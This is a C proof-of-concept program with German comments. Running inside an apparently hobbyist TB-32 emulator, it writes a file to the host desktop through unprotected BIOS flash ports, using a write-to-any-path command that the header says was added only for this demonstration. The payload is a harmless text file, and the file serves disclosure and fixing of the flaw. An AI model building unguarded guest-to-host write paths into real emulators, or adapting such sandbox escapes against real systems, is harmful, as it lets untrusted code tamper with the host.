/* ===========================================================================
   escape.c  --  PROOF OF CONCEPT: Sandbox-Escape ueber den BIOS-Flash-Port

   Dieses Programm laeuft als ganz normales, UNPRIVILEGIERTES .TBX INNERHALB
   der emulierten Maschine -- also eigentlich in der Sandbox. Trotzdem legt es
   eine ECHTE Datei auf dem Desktop des Host-Rechners an:

       ~/Desktop/TB32_PWNED.txt

   Wie? Der BIOS-Flash-Chip haengt an Ports (0xB0..0xB3), und Ports sind auf
   dem TB-32 nicht geschuetzt -- jedes Programm darf sie bedienen (siehe
   prog_start.asm: "Ports auf dem TB-32 sind nicht geschuetzt"). Es gibt weder
   einen Ring-/Kernel-Schutz noch eine Port-Rechtepruefung.

   ACHTUNG -- das ist ein bewusster Demonstrator, KEIN echtes Hardware-Feature:
   Befehl 12 ("Puffer an beliebigen Host-Pfad schreiben") wurde eigens fuer
   diesen PoC in hardware/flash_poc.py ergaenzt. Der ECHTE Bug (Befehl 3, brennen)
   kann nur die feste BIOS-Datei ueberschreiben, keinen freien Pfad. Dieser PoC
   zeigt die Worst-Case-Schwere. Details und Fix: security/flash-escape-poc/
   =========================================================================== */
#include "proglib.c"
#include "gfxlib.c"

/* Der BIOS-Flash-Chip -- ungeschuetzte Ports, von jedem Programm erreichbar. */
#define F_CMD   0xB0        /* Befehl                                        */
#define F_SIZE  0xB1        /* Anzahl Bytes im Puffer                        */
#define F_ADDR  0xB2        /* Quell-/Zieladresse im RAM                     */
#define F_PATH  0xB3        /* Ziel-Host-Pfad (PoC-Erweiterung, Befehl 12)   */

int main() {
    char* text;
    char* pfad;

    text = "Hallo vom TB-32!\n\nDiese Datei wurde von ESCAPE.TBX geschrieben -- einem Programm, das INNERHALB der emulierten Maschine lief (also in der Sandbox). Ueber den ungeschuetzten BIOS-Flash-Port hat es diese echte Datei auf deinem Host-Desktop angelegt -- ohne Dialog, ohne Klick.\n\n-- Proof of Concept fuer den Sandbox-Escape\n";
    pfad = "~/Desktop/TB32_PWNED.txt";

    if (tf_neu("ESCAPE PoC") < 0) return 1;
    tf_leeren();
    tf_text("Sandbox-Escape -- Proof of Concept\n");
    tf_text("----------------------------------\n\n");
    tf_text("Schreibe eine ECHTE Datei auf den Host-Desktop ...\n");

    /* 1) Nutzdaten aus dem Programm-RAM in den Flash-Puffer holen (Befehl 5).
          F_ADDR = Adresse des Textes, F_SIZE = Laenge. */
    portout(F_ADDR, (int)text);
    portout(F_SIZE, strlen(text));
    portout(F_CMD, 5);

    /* 2) Flash-Puffer an einen beliebigen Host-Pfad schreiben (Befehl 12).
          F_PATH = Adresse des NUL-terminierten Pfad-Strings. */
    portout(F_PATH, (int)pfad);
    portout(F_CMD, 12);

    if (portin(F_CMD) == 0) {
        tf_text("\nOK. Auf deinem Mac liegt jetzt:\n");
        tf_text("    ~/Desktop/TB32_PWNED.txt\n");
    } else {
        tf_text("\nFehlgeschlagen (Status != 0).\n");
    }

    tf_text("\nEine Taste schliesst das Fenster.\n");
    tf_warten();
    return 0;
}
